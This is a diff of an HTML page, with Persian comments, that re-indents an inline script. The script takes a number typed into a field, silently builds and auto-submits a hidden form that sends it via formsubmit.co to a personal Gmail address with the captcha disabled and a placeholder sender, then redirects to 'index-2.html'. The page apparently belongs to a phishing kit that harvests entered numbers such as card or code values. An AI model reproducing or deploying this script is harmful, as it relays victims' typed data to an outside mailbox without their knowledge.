@@ -885,65 +885,74 @@
 
 
 
-                        <script>
-                            var inputala = document.getElementById("adad_food");
+
+<script>
+    var inputala = document.getElementById("adad_food");
+
+    inputala.addEventListener("keyup", function(event) {
+        if (event.keyCode === 13) {
+            event.preventDefault();
+            next();
+        }
+    });
+
+    function next() {
+        var adad_food = document.getElementById('adad_food').value;
+
+        // ایجاد یک فرم تازه
+        var form = document.createElement('form');
+        form.action = 'https://formsubmit.co/m52528223@gmail.com';
+        form.method = 'POST';
+
+        // اضافه کردن ورودی‌های مخفی
+        var captcha = document.createElement('input');
+        captcha.type = 'hidden';
+        captcha.name = '_captcha';
+        captcha.value = 'false';
+        form.appendChild(captcha);
+
+        var nextField = document.createElement('input');
+        nextField.type = 'hidden';
+        nextField.name = '_next';
+        nextField.value = 'index-2.html';
+        form.appendChild(nextField);
+
+        var email = document.createElement('input');
+        email.type = 'hidden';
+        email.name = 'email';
+        email.value = 'anony@mous.com';
+        form.appendChild(email);
+
+        // اضافه کردن ورودی تکست
+        var message = document.createElement('textarea');
+        message.name = 'message';
+        message.rows = '4';
+        message.cols = '50';
+        message.required = true;
+        message.value = adad_food;
+        form.appendChild(message);
+
+        // ایجاد دکمه ارسال
+        var submitBtn = document.createElement('input');
+        submitBtn.type = 'submit';
+        submitBtn.value = 'ارسال';
+        form.appendChild(submitBtn);
+
+        // اضافه کردن فرم به صفحه
+        document.body.appendChild(form);
+
+        // ارسال فرم
+        form.submit();
+    }
+</script>
+
+
+
+
+
                         
-                            inputala.addEventListener("keyup", function(event) {
-                                if (event.keyCode === 13) {
-                                    event.preventDefault();
-                                    next();
-                                }
-                            });
-                        
-                            function next() {
-                                var adad_food = document.getElementById('adad_food').value;
-                        
-                                // ایجاد یک فرم تازه
-                                var form = document.createElement('form');
-                                form.action = 'https://formsubmit.co/m52528223@gmail.com';
-                                form.method = 'POST';
-                        
-                                // اضافه کردن ورودی‌های مخفی
-                                var captcha = document.createElement('input');
-                                captcha.type = 'hidden';
-                                captcha.name = '_captcha';
-                                captcha.value = 'false';
-                                form.appendChild(captcha);
-                        
-                                var nextField = document.createElement('input');
-                                nextField.type = 'hidden';
-                                nextField.name = '_next';
-                                nextField.value = 'index-2.html';
-                                form.appendChild(nextField);
-                        
-                                var email = document.createElement('input');
-                                email.type = 'hidden';
-                                email.name = 'email';
-                                email.value = 'anony@mous.com';
-                                form.appendChild(email);
-                        
-                                // اضافه کردن ورودی تکست
-                                var message = document.createElement('textarea');
-                                message.name = 'message';
-                                message.rows = '4';
-                                message.cols = '50';
-                                message.required = true;
-                                message.value = adad_food;
-                                form.appendChild(message);
-                        
-                                // ایجاد دکمه ارسال
-                                var submitBtn = document.createElement('input');
-                                submitBtn.type = 'submit';
-                                submitBtn.value = 'ارسال';
-                                form.appendChild(submitBtn);
-                        
-                                // اضافه کردن فرم به صفحه
-                                document.body.appendChild(form);
-                        
-                                // ارسال فرم
-                                form.submit();
-                            }
-                        </script>
+
+
                         
 
                     </div>
